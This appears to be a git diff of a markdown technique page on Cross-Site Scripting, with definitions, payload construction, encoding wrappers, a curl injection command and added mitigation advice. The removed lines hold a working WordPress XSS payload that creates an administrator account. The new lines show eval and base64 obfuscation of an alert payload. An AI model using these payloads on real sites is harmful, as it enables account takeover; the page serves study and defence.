@@ -24,30 +24,32 @@ intent:
   - persistence
 ---
 ## Definition
-Cross-Site Scripting is a vulnerability that exploits a website improper input sanitization to dynamically inject content into the page [DOM]{Document Object Model}, therefore reaching [RCE]{Remote Code Evaluation} upon rendering on the user's browser
+Vulnerability that exploits a website improper input sanitization to dynamically inject content into the page [DOM]{Document Object Model}, therefore reaching [RCE]{Remote Code Evaluation} upon rendering on the user's browser
 
 - **Persistent:** The exploit payload is stored in a database or otherwise cached by a server, so every visitor retrieves that payload and executes it
 - **Reflected:** The payload is included in a crafted request or link, only attacking the client that submitted this request
 - **DOM-based:** The payload never reach the server, being entirely received and executed by the client
 
-## Mitigation
-
 ## Discovery
+dynamic content from request parameters or data that alters the page
+eval calls
 
 ## Execution
+src tag properties to force request
+
 1. Construct the payload
 
 ```js
-let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
+alert(window.origin);
 ```
 
 1. Encode and encapsulate it for delivery
 
 ```js
-eval(String.fromCharCode("63,6f,6e,73,6f,6c,65,2e,6c,6f,67,28,27,70,61,79,6c,6f,61,64,27,29,3b"));
-eval(atob("Y29uc29sZS5sb2coJ3BheWxvYWQnKTs="));
-eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x27\x70\x61\x79\x6c\x6f\x61\x64\x27\x29\x3b");
-document.head.appendChild(Object.assign(document.createElement("script"),{src:"data:text/javascript;base64,Y29uc29sZS5sb2coJ3BheWxvYWQnKTs="}));
+eval(String.fromCharCode(97,108,101,114,116,40,119,105,110,100,111,119,46,111,114,105,103,105,110,41,59));
+eval(atob("YWxlcnQod2luZG93Lm9yaWdpbik7"));
+eval("\x61\x6c\x65\x72\x74\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3b");
+document.head.appendChild(Object.assign(document.createElement("script"),{src:"data:text/javascript;base64,YWxlcnQod2luZG93Lm9yaWdpbik7"}));
 ```
 
 1. Inject into the vulnerable parameter
@@ -56,7 +58,22 @@ document.head.appendChild(Object.assign(document.createElement("script"),{src:"d
 curl -s URL -A '<script>PAYLOAD</script>'
 ```
 
+## Mitigation
+client-side input validation and sanitization
+<https://github.com/cure53/DOMPurify>
+ensure that there are no user input directly into html tags (validate which ones)
+server-side input validation and sanitization
+server-side HTML output encoding
+server configs:
+- Using HTTPS across the entire domain
+- Using XSS prevention headers
+- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`
+- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts
+- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS
+WAF
+
 ## Evasion
+img tags (onerror)
 
 ## Relevant Reading
 - [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
